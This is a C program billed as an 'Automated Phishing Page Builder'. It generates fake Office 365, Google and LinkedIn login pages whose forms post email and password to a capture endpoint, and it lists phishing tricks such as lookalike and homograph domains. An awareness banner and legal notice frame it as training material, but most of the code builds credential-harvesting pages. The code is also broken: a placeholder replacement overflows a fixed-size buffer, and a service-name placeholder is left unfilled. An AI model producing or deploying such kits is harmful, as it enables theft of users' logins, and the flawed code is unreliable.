#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#define MAX_TEMPLATE_SIZE 10000
#define MAX_FILENAME_LENGTH 256

typedef struct {
    char name[50];
    char template[MAX_TEMPLATE_SIZE];
} phishing_template_t;

void generate_session_id(char* buffer, size_t size) {
    srand(time(NULL));
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    
    for (size_t i = 0; i < size - 1; i++) {
        int key = rand() % (int)(sizeof(charset) - 1);
        buffer[i] = charset[key];
    }
    buffer[size - 1] = '\0';
}

void replace_placeholder(char* template, const char* placeholder, const char* value) {
    char* pos = strstr(template, placeholder);
    if (pos) {
        size_t placeholder_len = strlen(placeholder);
        size_t value_len = strlen(value);
        size_t template_len = strlen(template);
        
        if (value_len != placeholder_len) {
            memmove(pos + value_len, pos + placeholder_len, 
                   template_len - (pos - template) - placeholder_len + 1);
        }
        
        memcpy(pos, value, value_len);
    }
}

void generate_basic_phishing_page(const char* service_name, const char* output_filename) {
    printf("Generating phishing page for: %s\n", service_name);
    
    char session_id[17];
    generate_session_id(session_id, sizeof(session_id));
    
    // Basic HTML template
    char template[] = 
    "<!DOCTYPE html>\n"
    "<html>\n"
    "<head>\n"
    "    <title>{{SERVICE_NAME}} Login</title>\n"
    "    <style>\n"
    "        body { font-family: Arial, sans-serif; margin: 40px; }\n"
    "        .login-box { max-width: 400px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }\n"
    "        input { width: 100%; padding: 10px; margin: 10px 0; }\n"
    "        button { background: #007cba; color: white; padding: 10px 20px; border: none; }\n"
    "    </style>\n"
    "</head>\n"
    "<body>\n"
    "    <div class=\"login-box\">\n"
    "        <h2>Sign in to {{SERVICE_NAME}}</h2>\n"
    "        <form action=\"/capture\" method=\"POST\">\n"
    "            <input type=\"email\" name=\"email\" placeholder=\"Email\" required>\n"
    "            <input type=\"password\" name=\"password\" placeholder=\"Password\" required>\n"
    "            <input type=\"hidden\" name=\"session_id\" value=\"{{SESSION_ID}}\">\n"
    "            <button type=\"submit\">Sign In</button>\n"
    "        </form>\n"
    "        <p style=\"color: red; font-size: 12px; margin-top: 20px;\">\n"
    "            SECURITY AWARENESS: This is a simulated phishing page for educational purposes.\n"
    "        </p>\n"
    "    </div>\n"
    "</body>\n"
    "</html>\n";
    
    // Replace placeholders
    replace_placeholder(template, "{{SERVICE_NAME}}", service_name);
    replace_placeholder(template, "{{SESSION_ID}}", session_id);
    
    // Write to file
    FILE* file = fopen(output_filename, "w");
    if (file) {
        fputs(template, file);
        fclose(file);
        printf("Saved to: %s\n", output_filename);
        printf("Session ID: %s\n", session_id);
    } else {
        printf("Error creating file: %s\n", output_filename);
    }
}

void demonstrate_phishing_techniques() {
    printf("\n=== PHISHING TECHNIQUES DEMONSTRATION ===\n");
    
    printf("\n1. URL Obfuscation:\n");
    printf("   Legitimate: https://google.com\n");
    printf("   Phishing:   https://goog1e.com\n");
    printf("   Phishing:   https://google.com.security-update.com\n");
    
    printf("\n2. Homograph Attacks:\n");
    printf("   Legitimate: apple.com\n");
    printf("   Phishing:   аррӏе.com (using Cyrillic characters)\n");
    
    printf("\n3. Social Engineering:\n");
    printf("   - Urgent security alerts\n");
    printf("   - Fake package delivery notifications\n");
    printf("   - Impersonating IT support\n");
    
    printf("\n4. Technical Evasion:\n");
    printf("   - Domain generation algorithms\n");
    printf("   - HTTPS with valid certificates\n");
    printf("   - IP address instead of domain\n");
}

void show_security_recommendations() {
    printf("\n=== SECURITY RECOMMENDATIONS ===\n");
    
    printf("\nFor Users:\n");
    printf("   ✅ Use password managers to avoid typing passwords\n");
    printf("   ✅ Enable multi-factor authentication\n");
    printf("   ✅ Verify URLs before entering credentials\n");
    printf("   ✅ Don't click links in unsolicited emails\n");
    printf("   ✅ Use email filtering and anti-phishing tools\n");
    
    printf("\nFor Organizations:\n");
    printf("   ✅ Conduct regular security awareness training\n");
    printf("   ✅ Implement DMARC, DKIM, and SPF\n");
    printf("   ✅ Use web filtering solutions\n");
    printf("   ✅ Monitor for credential leaks\n");
    printf("   ✅ Conduct regular phishing simulations\n");
}

int main() {
    printf("Automated Phishing Page Builder - C Edition\n");
    printf("===========================================\n");
    printf("FOR EDUCATIONAL AND AUTHORIZED TESTING USE ONLY\n\n");
    
    // Generate sample phishing pages
    generate_basic_phishing_page("Office 365", "office365_phishing.html");
    generate_basic_phishing_page("Google", "google_phishing.html");
    generate_basic_phishing_page("LinkedIn", "linkedin_phishing.html");
    
    demonstrate_phishing_techniques();
    show_security_recommendations();
    
    printf("\n=== IMPORTANT LEGAL NOTICE ===\n");
    printf("This tool is for:\n");
    printf("  ✅ Security awareness training\n");
    printf("  ✅ Authorized penetration testing\n");
    printf("  ✅ Educational purposes\n");
    printf("\nNEVER use this tool for:\n");
    printf("  ❌ Unauthorized testing\n");
    printf("  ❌ Malicious purposes\n");
    printf("  ❌ Attacks without explicit permission\n");
    
    return 0;
}
